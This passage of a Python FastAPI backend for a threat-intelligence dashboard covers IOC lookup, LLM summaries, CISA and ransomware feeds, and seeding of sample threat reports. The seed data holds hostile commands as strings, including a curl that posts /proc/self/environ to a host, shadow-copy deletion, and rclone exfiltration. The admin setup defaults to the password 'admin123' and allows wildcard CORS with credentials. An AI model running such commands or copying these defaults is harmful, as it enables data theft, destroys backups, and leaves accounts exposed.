                        enr["source_label"] = j.get("KnownMalicious") or ("NSRL known-good file" if j.get("RDS:package_id") else "Known file")
                        enr["note"] = None
            except Exception:
                pass
            result["enrichment"] = enr
    except Exception as e:
        logger.error(f"IOC enrichment error: {e}")

    try:
        result["reputation"] = await _reputation(hc, kind, normalized)
    except Exception as e:
        logger.error(f"IOC reputation error: {e}")

    return result


@api_router.get("/ioc-config")
async def ioc_config():
    """Tells the frontend which key-based reputation providers are active."""
    return {"vt_enabled": bool(VT_API_KEY), "abuseipdb_enabled": bool(ABUSEIPDB_API_KEY)}


@api_router.get("/ioc-lookup")
async def ioc_lookup(value: str):
    value = (value or "").strip()
    if not value or len(value) > 2048:
        raise HTTPException(status_code=400, detail="Provide a valid IOC (hash, IP, domain or URL)")
    if _classify_ioc(value) == "unknown":
        raise HTTPException(status_code=422, detail="Could not recognize this as a hash, IP, domain or URL")
    async with httpx.AsyncClient(timeout=12, follow_redirects=True) as hc:
        return await _do_lookup(hc, value)


class BatchIOCInput(BaseModel):
    values: List[str] = Field(default_factory=list)


@api_router.post("/ioc-lookup-batch")
async def ioc_lookup_batch(payload: BatchIOCInput):
    # Accept a list of raw entries; split each on whitespace/comma/semicolon/newline.
    tokens: List[str] = []
    for entry in (payload.values or []):
        for tok in re.split(r"[\s,;]+", (entry or "").strip()):
            tok = tok.strip()
            if tok:
                tokens.append(tok)
    # Dedupe (case-insensitive) preserving order, cap at 50.
    seen = set()
    items: List[str] = []
    for t in tokens:
        key = t.lower()
        if key not in seen:
            seen.add(key)
            items.append(t)
    if not items:
        raise HTTPException(status_code=400, detail="Provide at least one IOC to analyze")
    if len(items) > 50:
        items = items[:50]

    sem = asyncio.Semaphore(8)
    async with httpx.AsyncClient(timeout=12, follow_redirects=True) as hc:
        async def one(v: str) -> dict:
            async with sem:
                try:
                    return await _do_lookup(hc, v)
                except Exception:
                    return {"value": v, "type": "unknown", "links": {}, "enrichment": None, "reputation": None}
        results = await asyncio.gather(*[one(v) for v in items])

    return {"count": len(results), "results": results}


class AiSummaryInput(BaseModel):
    value: str


_AI_TTL = timedelta(days=7)
_AI_SYSTEM = (
    "You are a senior threat-intelligence analyst at a cybersecurity firm. "
    "Given an indicator of compromise (IOC) and its OSINT enrichment data, write a concise, factual "
    "threat assessment for a SOC analyst. Cover: what the indicator is, an overall risk verdict, the most "
    "notable context (reputation scores, geo, open ports, malware family/tags, whether it is in the internal "
    "database), and one clear recommended action. 4-6 sentences, plain prose, no markdown headings or bullet "
    "lists. Only use facts present in the provided data — never fabricate detections, names or attribution."
)


@api_router.get("/ai-config")
async def ai_config():
    return {"ai_enabled": bool(EMERGENT_LLM_KEY)}


@api_router.post("/ioc-ai-summary")
async def ioc_ai_summary(payload: AiSummaryInput):
    if not EMERGENT_LLM_KEY:
        raise HTTPException(status_code=503, detail="AI analysis is not configured")
    value = (payload.value or "").strip()
    if not value or _classify_ioc(value) == "unknown":
        raise HTTPException(status_code=422, detail="Provide a valid IOC (hash, IP, domain or URL)")

    ck = _ioc_key(value)
    try:
        cached = await db.ioc_ai_cache.find_one({"_id": ck})
        if cached and cached.get("ts") and datetime.now(timezone.utc) - datetime.fromisoformat(cached["ts"]) < _AI_TTL:
            return {"summary": cached["summary"], "cached": True}
    except Exception:
        pass

    async with httpx.AsyncClient(timeout=12, follow_redirects=True) as hc:
        result = await _do_lookup(hc, value)

    en = result.get("enrichment") or {}
    ctx: dict = {"type": result.get("type"), "reputation": result.get("reputation"), "in_internal_database": result.get("local_db")}
    if en.get("kind") == "ip":
        ctx.update({"geo": en.get("geo"), "open_ports": en.get("open_ports"), "known_vulns": en.get("vulns"), "tags": en.get("tags")})
    elif en.get("kind") == "web":
        ctx.update({"resolved_ip": en.get("resolved_ip"), "geo": en.get("geo"), "open_ports": en.get("open_ports"), "urlscan_scan_count": en.get("scan_count"), "known_vulns": en.get("vulns")})
    elif en.get("kind") == "hash":
        ctx.update({"in_known_file_db": en.get("found"), "known_malicious": en.get("known_malicious"), "filename": en.get("filename")})

    prompt = f"IOC: {value}\nEnrichment data (JSON):\n{json.dumps(ctx, default=str)[:6000]}"

    try:
        from emergentintegrations.llm.chat import LlmChat, UserMessage
        chat = LlmChat(api_key=EMERGENT_LLM_KEY, session_id=f"ioc-{ck}", system_message=_AI_SYSTEM).with_model("gemini", "gemini-3-flash-preview")
        resp = await chat.send_message(UserMessage(text=prompt))
        summary = resp if isinstance(resp, str) else str(resp)
        summary = summary.strip()
    except Exception as e:
        logger.error(f"AI summary error: {e}")
        raise HTTPException(status_code=502, detail="AI analysis failed. Please try again.")

    try:
        await db.ioc_ai_cache.update_one({"_id": ck}, {"$set": {"summary": summary, "ts": now_iso()}}, upsert=True)
    except Exception:
        pass
    return {"summary": summary, "cached": False}


@api_router.get("/live-feed")
async def live_feed():
    now = datetime.now(timezone.utc)
    if _feed_cache["data"] and _feed_cache["ts"] and (now - _feed_cache["ts"]) < timedelta(minutes=5):
        return _feed_cache["data"]
    try:
        async with httpx.AsyncClient(timeout=15) as hc:
            r = await hc.get(CISA_FEED_URL)
            r.raise_for_status()
            raw = r.json()
        vulns = raw.get("vulnerabilities", [])
        vulns_sorted = sorted(vulns, key=lambda v: v.get("dateAdded", ""), reverse=True)
        recent = [
            {
                "cve": v.get("cveID"),
                "vendor": v.get("vendorProject"),
                "product": v.get("product"),
                "name": v.get("vulnerabilityName"),
                "dateAdded": v.get("dateAdded"),
                "action": v.get("requiredAction"),
                "ransomware": v.get("knownRansomwareCampaignUse", "Unknown"),
                "nvd_url": f"https://nvd.nist.gov/vuln/detail/{v.get('cveID')}",
                "detail_url": f"https://www.cisa.gov/known-exploited-vulnerabilities-catalog?search_api_fulltext={v.get('cveID')}",
            }
            for v in vulns_sorted
        ]
        result = {
            "source": "CISA Known Exploited Vulnerabilities",
            "catalog_version": raw.get("catalogVersion"),
            "total_count": raw.get("count", len(vulns)),
            "ransomware_linked": sum(1 for v in vulns if v.get("knownRansomwareCampaignUse") == "Known"),
            "updated": now.isoformat(),
            "returned": len(recent),
            "items": recent,
        }
        _feed_cache["data"] = result
        _feed_cache["ts"] = now
        return result
    except Exception as e:
        logger.error(f"Live feed error: {e}")
        if _feed_cache["data"]:
            return _feed_cache["data"]
        raise HTTPException(status_code=502, detail="Unable to reach live threat feed")


_attack_cache: dict[str, Any] = {"ts": None, "data": None}


@api_router.get("/attack-feed")
async def attack_feed():
    """Real-time attack feed: recent ransomware victims from ransomware.live (cached 20 min)."""
    now = datetime.now(timezone.utc)
    if _attack_cache["data"] and _attack_cache["ts"] and (now - _attack_cache["ts"]) < timedelta(minutes=5):
        return _attack_cache["data"]
    try:
        async with httpx.AsyncClient(timeout=15, follow_redirects=True) as hc:
            r = await hc.get("https://api.ransomware.live/v2/recentvictims")
            r.raise_for_status()
            raw = r.json()
        items = []
        for v in raw[:40]:
            items.append({
                "victim": v.get("victim"),
                "group": v.get("group"),
                "country": v.get("country"),
                "sector": v.get("activity") if v.get("activity") not in (None, "Not Found") else None,
                "domain": v.get("domain"),
                "date": v.get("attackdate") or v.get("discovered"),
                "screenshot": v.get("screenshot"),
                "url": v.get("url"),
            })
        result = {
            "source": "ransomware.live · Recent Victims",
            "updated": now.isoformat(),
            "count": len(items),
            "items": items,
        }
        _attack_cache["data"] = result
        _attack_cache["ts"] = now
        return result
    except Exception as e:
        logger.error(f"Attack feed error: {e}")
        if _attack_cache["data"]:
            return _attack_cache["data"]
        raise HTTPException(status_code=502, detail="Unable to reach live attack feed")


# ---------------------------------------------------------------------------
# Real-time Threat Landscape aggregate — powers the "Threat landscape, right now"
# dashboard on the marketing landing. Aggregates fresh CISA KEV + ransomware.live
# + the curated IOC DB + last-sync timestamps into a single payload that the
# frontend polls every 30 seconds.
# ---------------------------------------------------------------------------
def _parse_victim_dt(v: dict) -> Optional[datetime]:
    for key in ("attackdate", "discovered", "date"):
        raw = v.get(key)
        if not raw:
            continue
        # ransomware.live returns "YYYY-MM-DD HH:MM:SS.SSS" (no tz) — treat as UTC.
        for fmt in ("%Y-%m-%d %H:%M:%S.%f", "%Y-%m-%d %H:%M:%S", "%Y-%m-%d"):
            try:
                return datetime.strptime(raw, fmt).replace(tzinfo=timezone.utc)
            except ValueError:
                continue
    return None


@api_router.get("/threat-landscape/live")
async def threat_landscape_live():
    """Real-time aggregate for the landing 'Threat landscape' panel.
    Returns fresh CVE/ransomware/curated-IOC stats + recent activity so the
    UI can render a truly dynamic dashboard (frontend polls every 30s)."""
    now = datetime.now(timezone.utc)

    # --- CISA KEV (uses the same 5-min cache as /live-feed)
    total_cves = 0
    ransomware_linked = 0
    newest_cves: List[dict] = []
    try:
        feed = await live_feed()  # reuses cache
        total_cves = int(feed.get("total_count") or 0)
        ransomware_linked = int(feed.get("ransomware_linked") or 0)
        newest_cves = (feed.get("items") or [])[:6]
    except Exception as e:
        logger.warning(f"landscape/live: CISA fetch failed: {e}")

    # --- Ransomware.live (recent victims, uses 5-min cache)
    victims_24h = 0
    newest_victims: List[dict] = []
    try:
        atk = await attack_feed()
        items = atk.get("items") or []
        cutoff = now - timedelta(hours=24)
        for v in items:
            dt = _parse_victim_dt(v)
            if dt and dt >= cutoff:
                victims_24h += 1
        newest_victims = items[:6]
    except Exception as e:
        logger.warning(f"landscape/live: ransomware.live fetch failed: {e}")

    # --- Curated IOC database (live count + severity split)
    total_iocs = await db.iocs.count_documents({}) or 0
    critical_iocs = await db.iocs.count_documents({"severity": "critical"}) or 0

    # --- Last sync across all sync-meta docs (freshness signal)
    last_synced_at = None
    last_synced_source = None
    try:
        async for doc in db.sync_meta.find({}, {"_id": 1, "synced_at": 1}):
            ts = doc.get("synced_at")
            if ts and (last_synced_at is None or ts > last_synced_at):
                last_synced_at = ts
                last_synced_source = doc.get("_id")
        otx_doc = await db.otx_meta.find_one({"_id": "last_sync"}, {"synced_at": 1})
        if otx_doc and otx_doc.get("synced_at") and (last_synced_at is None or otx_doc["synced_at"] > last_synced_at):
            last_synced_at = otx_doc["synced_at"]
            last_synced_source = "otx"
    except Exception:
        pass

    # --- New CVEs added in the last 7 days (approximate "attack surface velocity")
    cves_last_7d = 0
    try:
        week_cutoff = (now - timedelta(days=7)).date().isoformat()
        for c in newest_cves:
            if (c.get("dateAdded") or "") >= week_cutoff:
                cves_last_7d += 1
        # Extend the count by scanning the full feed (already cached).
        if _feed_cache.get("data"):
            for c in (_feed_cache["data"].get("items") or []):
                if (c.get("dateAdded") or "") >= week_cutoff:
                    cves_last_7d += 1
            # We double-counted the newest set above; subtract it back.
            cves_last_7d -= sum(1 for c in newest_cves if (c.get("dateAdded") or "") >= week_cutoff)
    except Exception:
        pass

    return {
        "updated_at": now.isoformat(),
        "stats": {
            "total_cves": total_cves,
            "ransomware_linked_cves": ransomware_linked,
            "cves_last_7d": max(cves_last_7d, 0),
            "victims_24h": victims_24h,
            "curated_iocs": total_iocs,
            "critical_iocs": critical_iocs,
        },
        "last_synced_at": last_synced_at,
        "last_synced_source": last_synced_source,
        "newest_cves": newest_cves,
        "newest_victims": newest_victims,
    }



# ---------------------------------------------------------------------------
# Unit42 Timely Threat Intel feed (real published intel from Palo Alto GitHub)
# ---------------------------------------------------------------------------
_intel_cache: dict[str, Any] = {"ts": None, "data": None}
UNIT42_REPO = "PaloAltoNetworks/Unit42-timely-threat-intel"

_INTEL_IMAGES = {
    "phishing": "https://images.pexels.com/photos/5380664/pexels-photo-5380664.jpeg?auto=compress&cs=tinysrgb&w=1000",
    "ransomware": "https://images.pexels.com/photos/60504/security-protection-anti-virus-software-60504.jpeg?auto=compress&cs=tinysrgb&w=1000",
    "rat": "https://images.pexels.com/photos/5473298/pexels-photo-5473298.jpeg?auto=compress&cs=tinysrgb&w=1000",
    "loader": "https://images.pexels.com/photos/11035380/pexels-photo-11035380.jpeg?auto=compress&cs=tinysrgb&w=1000",
    "scam": "https://images.pexels.com/photos/5380642/pexels-photo-5380642.jpeg?auto=compress&cs=tinysrgb&w=1000",
    "stealer": "https://images.pexels.com/photos/2881229/pexels-photo-2881229.jpeg?auto=compress&cs=tinysrgb&w=1000",
    "default": "https://images.pexels.com/photos/5483240/pexels-photo-5483240.jpeg?auto=compress&cs=tinysrgb&w=1000",
}


def _pick_intel_image(title: str) -> str:
    t = title.lower()
    for key, url in _INTEL_IMAGES.items():
        if key != "default" and key in t:
            return url
    return _INTEL_IMAGES["default"]


INTEL_TYPES = ["Ransomware", "Phishing", "RAT", "Loader", "Stealer", "Scam", "APT", "Other"]


def _intel_type(title: str) -> str:
    t = title.lower()
    if any(k in t for k in ["ransom", "lockbit", "akira", "blackcat", "alphv", "encrypt"]):
        return "Ransomware"
    if any(k in t for k in ["phish", "smish", "clickfix", "credential"]):
        return "Phishing"
    if any(k in t for k in ["rat", "asyncrat", "remote access", "njrat", "remcos"]):
        return "RAT"
    if any(k in t for k in ["loader", "castleloader", "downloader", "dropper"]):
        return "Loader"
    if any(k in t for k in ["stealer", "infostealer", "lumma", "redline"]):
        return "Stealer"
    if any(k in t for k in ["scam", "fraud", "impersonat"]):
        return "Scam"
    if any(k in t for k in ["apt", "espionage", "state-sponsored", "nation"]):
        return "APT"
    return "Other"


_intel_listing: dict[str, Any] = {"ts": None, "names": None}


async def _get_unit42_listing() -> list:
    now = datetime.now(timezone.utc)
    if _intel_listing["names"] and _intel_listing["ts"] and (now - _intel_listing["ts"]) < timedelta(minutes=60):
        return _intel_listing["names"]
    async with httpx.AsyncClient(timeout=20, follow_redirects=True) as hc:
        listing = await hc.get(f"https://api.github.com/repos/{UNIT42_REPO}/contents/")
        listing.raise_for_status()
        names = sorted([f["name"] for f in listing.json() if f["name"].endswith(".txt")], reverse=True)
    _intel_listing["names"] = names
    _intel_listing["ts"] = now
    return names


def _parse_unit42(name: str, text: str) -> dict:
    date = name[:10]
    title = name[11:-4].replace("-", " ")
    lines = text.splitlines()
    section = None
    notes, refs, indicators, authors = [], [], [], []
    for ln in lines:
        s = ln.strip()
        up = s.upper()
        if up.startswith("NOTES:"):
            section = "notes"
            continue
        if up.startswith("REFERENCES:"):
            section = "refs"
            continue
        if up.startswith("INDICATORS:") or up.startswith("INDICATORS "):
            section = "ind"
            continue
        if up.startswith("AUTHOR:"):
            section = "author"
            continue
        if not s:
            continue
        if section == "notes" and s.startswith("-"):
            notes.append(s.lstrip("- ").strip())
        elif section == "refs" and ("http" in s):
            refs.append(s.lstrip("- ").strip())
        elif section == "author" and s.startswith("-"):
            authors.append(s.lstrip("- ").strip())
        elif section == "ind":
            indicators.append(s)
    summary = " ".join(notes[:2])[:320] if notes else title
    ioc_lines = [i for i in indicators if "[.]" in i or "[:]" in i or "sha256" in i.lower() or "md5" in i.lower()]
    return {
        "name": name,
        "title": title,
        "date": date,
        "type": _intel_type(title),
        "authors": authors,
        "summary": summary,
        "notes": notes,
        "references": refs,
        "indicators": ioc_lines,
        "reference": refs[0] if refs else f"https://github.com/{UNIT42_REPO}/blob/main/{name}",
        "url": f"https://github.com/{UNIT42_REPO}/blob/main/{name}",
        "ioc_count": len(ioc_lines),
        "image": _pick_intel_image(title),
        "source": "Palo Alto Unit42",
    }


def _intel_card(full: dict) -> dict:
    """Lightweight card view (drops heavy indicator/notes lists)."""
    return {
        "name": full["name"], "title": full["title"], "date": full["date"], "type": full["type"],
        "summary": full["summary"], "reference": full["reference"], "url": full["url"],
        "ioc_count": full["ioc_count"], "image": full["image"], "source": full["source"],
    }


@api_router.get("/intel-report/{name}")
async def intel_report(name: str):
    """Full parsed Unit42 report for the in-app reader."""
    if not re.match(r"^[0-9A-Za-z._-]+\.txt$", name):
        raise HTTPException(status_code=400, detail="Invalid report name")
    try:
        async with httpx.AsyncClient(timeout=20, follow_redirects=True) as hc:
            resp = await hc.get(f"https://raw.githubusercontent.com/{UNIT42_REPO}/main/{name}")
            resp.raise_for_status()
            full = _parse_unit42(name, resp.text)
        full["indicators"] = full["indicators"][:500]
        return full
    except HTTPException:
        raise
    except Exception as e:
        logger.error(f"Intel report error for {name}: {e}")
        raise HTTPException(status_code=502, detail="Unable to load report")


@api_router.get("/intel-feed")
async def intel_feed(page: int = 1, page_size: int = 9, q: str = "", type: str = "", since: str = ""):
    """Paginated + filterable Unit42 intel feed. Filters on filename metadata, fetches content per page."""
    page = max(1, page)
    page_size = min(max(1, page_size), 24)
    try:
        names = await _get_unit42_listing()

        def match(name: str) -> bool:
            title = name[11:-4].replace("-", " ")
            date = name[:10]
            if q and q.lower() not in title.lower():
                return False
            if type and _intel_type(title) != type:
                return False
            if since and date < since:
                return False
            return True

        filtered = [n for n in names if match(n)]
        total = len(filtered)
        start = (page - 1) * page_size
        page_names = filtered[start:start + page_size]

        async with httpx.AsyncClient(timeout=20, follow_redirects=True) as hc:
            async def fetch(name):
                try:
                    resp = await hc.get(f"https://raw.githubusercontent.com/{UNIT42_REPO}/main/{name}")
                    resp.raise_for_status()
                    return _intel_card(_parse_unit42(name, resp.text))
                except Exception:
                    return _intel_card(_parse_unit42(name, ""))

            items = await asyncio.gather(*[fetch(n) for n in page_names])

        return {
            "source": "Palo Alto Networks · Unit42 Timely Threat Intel",
            "repo_url": f"https://github.com/{UNIT42_REPO}",
            "updated": datetime.now(timezone.utc).isoformat(),
            "types": INTEL_TYPES,
            "total": total,
            "page": page,
            "page_size": page_size,
            "has_more": start + page_size < total,
            "count": len(items),
            "items": list(items),
        }
    except Exception as e:
        logger.error(f"Intel feed error: {e}")
        raise HTTPException(status_code=502, detail="Unable to reach Unit42 intel feed")


@api_router.get("/")
async def root():
    return {"message": "NivX Machines API online"}


app.include_router(api_router)

app.add_middleware(
    CORSMiddleware,
    allow_credentials=True,
    allow_origins=os.environ.get('CORS_ORIGINS', '*').split(','),
    allow_methods=["*"],
    allow_headers=["*"],
)


# ---------------------------------------------------------------------------
# Seeding
# ---------------------------------------------------------------------------
async def seed_admin():
    admin_email = os.environ.get("ADMIN_EMAIL", "admin@nivxmachines.com").lower()
    admin_password = os.environ.get("ADMIN_PASSWORD", "admin123")
    existing = await db.users.find_one({"email": admin_email})
    if existing is None:
        await db.users.insert_one({
            "email": admin_email,
            "password_hash": hash_password(admin_password),
            "name": "NivX Admin",
            "role": "admin",
            "created_at": now_iso(),
        })
        logger.info("Seeded admin user")
    elif not verify_password(admin_password, existing["password_hash"]):
        await db.users.update_one({"email": admin_email}, {"$set": {"password_hash": hash_password(admin_password)}})


SAMPLE_THREATS = [
    {
        "title": "APT41 Supply-Chain Implant via Signed Binary",
        "summary": "State-aligned actor abused a trusted software update channel to deploy a memory-resident implant, establishing C2 over HTTPS beaconing to a fronted domain.",
        "severity": "critical",
        "category": "APT / Supply Chain",
        "threat_actor": "APT41 (Double Dragon)",
        "image_url": "https://images.unsplash.com/photo-1555066931-4365d14bab8c?crop=entropy&cs=srgb&fm=jpg&q=85&w=1200",
        "attack_chain": ["Initial Access", "Execution", "Persistence", "Defense Evasion", "Command & Control", "Exfiltration"],
        "iocs": ["sha256:9f2b...c41a", "domain:cdn-update[.]net", "ip:45.61.136.9"],
        "process_tree": {
            "name": "update.exe", "pid": "4120", "cmd": "update.exe /silent", "malicious": False,
            "children": [
                {"name": "rundll32.exe", "pid": "5188", "cmd": "rundll32 loader.dll,Start", "malicious": True, "children": [
                    {"name": "powershell.exe", "pid": "6012", "cmd": "-enc SQBFAFgA...", "malicious": True, "children": []}
                ]}
            ]
        },
        "source": "NivX Threat Intel",
    },
    {
        "title": "Akira Ransomware Exploiting VPN Zero-Day",
        "summary": "Affiliate leveraged an unpatched VPN appliance to gain a foothold, disabled EDR, and detonated ransomware across the domain within 6 hours of intrusion.",
        "severity": "critical",
        "category": "Ransomware",
        "threat_actor": "Akira",
        "image_url": "https://images.unsplash.com/photo-1644088379091-d574269d422f?crop=entropy&cs=srgb&fm=jpg&q=85&w=1200",
        "attack_chain": ["Initial Access", "Credential Access", "Lateral Movement", "Defense Evasion", "Impact"],
        "iocs": ["sha256:1a77...ff03", "ext:.akira", "ip:185.156.72.14"],
        "process_tree": {
            "name": "svchost.exe", "pid": "980", "cmd": "svchost -k netsvcs", "malicious": False,
            "children": [
                {"name": "cmd.exe", "pid": "2210", "cmd": "vssadmin delete shadows /all", "malicious": True, "children": [
                    {"name": "akira.exe", "pid": "3320", "cmd": "akira.exe -p C:\\", "malicious": True, "children": []}
                ]}
            ]
        },
        "source": "NivX Threat Intel",
    },
    {
        "title": "AI-Generated Phishing Kit Targeting Fintech",
        "summary": "LLM-crafted lures with pixel-perfect cloned login portals harvested MFA tokens via reverse-proxy (AiTM). NivX AI classifier flagged anomalous domain entropy.",
        "severity": "high",
        "category": "Phishing / AiTM",
        "threat_actor": "Storm-1101 (cluster)",
        "image_url": "https://images.unsplash.com/photo-1680992046626-418f7e910589?crop=entropy&cs=srgb&fm=jpg&q=85&w=1200",
        "attack_chain": ["Reconnaissance", "Resource Development", "Initial Access", "Credential Access"],
        "iocs": ["domain:secure-fintech-login[.]com", "url:/auth/relay", "ja3:e7d705a3..."],
        "process_tree": {
            "name": "chrome.exe", "pid": "7788", "cmd": "chrome --app=https://phish", "malicious": False,
            "children": [
                {"name": "relay-proxy", "pid": "8090", "cmd": "evilginx2", "malicious": True, "children": []}
            ]
        },
        "source": "NivX Threat Intel",
    },
    {
        "title": "Scattered Spider Help-Desk Social Engineering",
        "summary": "Threat actor impersonated employees to a service desk, reset MFA, and pivoted to cloud identity provider. NivX identity analytics flagged impossible-travel sign-ins minutes before privilege escalation.",
        "severity": "critical",
        "category": "Identity / Social Engineering",
        "threat_actor": "Scattered Spider (UNC3944)",
        "image_url": "https://images.pexels.com/photos/5380664/pexels-photo-5380664.jpeg?auto=compress&cs=tinysrgb&w=1200",
        "attack_chain": ["Reconnaissance", "Initial Access", "Privilege Escalation", "Lateral Movement", "Collection", "Exfiltration"],
        "iocs": ["ip:104.28.246.11", "email:it-support@nivx-helpdesk[.]com", "ua:Mozilla/5.0 (okta-bypass)"],
        "process_tree": {
            "name": "okta-session", "pid": "-", "cmd": "MFA reset via help desk", "malicious": True,
            "children": [
                {"name": "aws-cli", "pid": "3011", "cmd": "aws sts assume-role", "malicious": True, "children": [
                    {"name": "s3-sync", "pid": "3044", "cmd": "aws s3 sync s3://crown-jewels ./", "malicious": True, "children": []}
                ]}
            ]
        },
        "source": "NivX Threat Intel",
    },
    {
        "title": "LockBit Affiliate Double-Extortion Campaign",
        "summary": "Initial access broker sold RDP creds; affiliate exfiltrated 400GB before encryption. NivX MDR isolated 3 hosts and blocked the exfil channel, containing spread to 4% of the estate.",
        "severity": "critical",
        "category": "Ransomware",
        "threat_actor": "LockBit 3.0 affiliate",
        "image_url": "https://images.pexels.com/photos/60504/security-protection-anti-virus-software-60504.jpeg?auto=compress&cs=tinysrgb&w=1200",
        "attack_chain": ["Initial Access", "Discovery", "Lateral Movement", "Collection", "Exfiltration", "Impact"],
        "iocs": ["sha256:c9d3...81be", "ext:.lockbit", "ip:193.201.9.55", "tool:rclone.exe"],
        "process_tree": {
            "name": "mstsc.exe", "pid": "1120", "cmd": "RDP session (stolen creds)", "malicious": True,
            "children": [
                {"name": "rclone.exe", "pid": "2288", "cmd": "rclone copy C:\\ mega:exfil", "malicious": True, "children": []},
                {"name": "lockbit.exe", "pid": "2290", "cmd": "lockbit -encrypt -spread", "malicious": True, "children": []}
            ]
        },
        "source": "NivX Threat Intel",
    },
    {
        "title": "Malicious npm Package Backdoors CI Pipeline",
        "summary": "A typosquatted dependency executed a postinstall script that exfiltrated CI secrets and planted a build-time backdoor. NivX SCA blocked the package hash across all pipelines.",
        "severity": "high",
        "category": "Supply Chain / DevSecOps",
        "threat_actor": "Unattributed",
        "image_url": "https://images.pexels.com/photos/11035380/pexels-photo-11035380.jpeg?auto=compress&cs=tinysrgb&w=1200",
        "attack_chain": ["Resource Development", "Initial Access", "Execution", "Credential Access", "Exfiltration"],
        "iocs": ["npm:reqwest-utils@1.2.9", "domain:collect-metrics[.]dev", "sha256:44af...9c02"],
        "process_tree": {
            "name": "node", "pid": "512", "cmd": "npm install", "malicious": False,
            "children": [
                {"name": "sh", "pid": "540", "cmd": "node postinstall.js", "malicious": True, "children": [
                    {"name": "curl", "pid": "551", "cmd": "curl -d @/proc/self/environ collect-metrics.dev", "malicious": True, "children": []}
                ]}
            ]
        },
        "source": "NivX Threat Intel",
    },
    {
        "title": "Volt Typhoon Living-off-the-Land in OT Network",
        "summary": "State actor used only built-in tools (LOLBins) to persist in critical-infrastructure OT for months. NivX behavioral analytics surfaced anomalous wmic and netsh usage from a jump host.",
        "severity": "high",
        "category": "APT / Critical Infrastructure",
        "threat_actor": "Volt Typhoon",
        "image_url": "https://images.pexels.com/photos/2881229/pexels-photo-2881229.jpeg?auto=compress&cs=tinysrgb&w=1200",
        "attack_chain": ["Initial Access", "Persistence", "Defense Evasion", "Discovery", "Lateral Movement"],
        "iocs": ["ip:45.32.174.20", "lolbin:wmic.exe", "lolbin:netsh.exe", "cred:cached NTLM"],
        "process_tree": {
            "name": "wmiprvse.exe", "pid": "760", "cmd": "wmic process call create", "malicious": True,
            "children": [
                {"name": "netsh.exe", "pid": "812", "cmd": "netsh interface portproxy add", "malicious": True, "children": []}
            ]
        },
        "source": "NivX Threat Intel",
    },
]


async def seed_threats():
    for t in SAMPLE_THREATS:
        existing = await db.threat_reports.find_one({"title": t["title"]})
        if existing is None:
            report = ThreatReport(**t)
            await db.threat_reports.insert_one(report.model_dump())
    logger.info("Threat reports seeded/verified")


@app.on_event("startup")
async def startup():
    await db.users.create_index("email", unique=True)
    await seed_admin()
    await seed_threats()
    if OTX_API_KEY:
        asyncio.create_task(_otx_sync_loop())
        logger.info("AlienVault OTX sync loop scheduled (startup + daily)")


@app.on_event("shutdown")
async def shutdown_db_client():
    client.close()
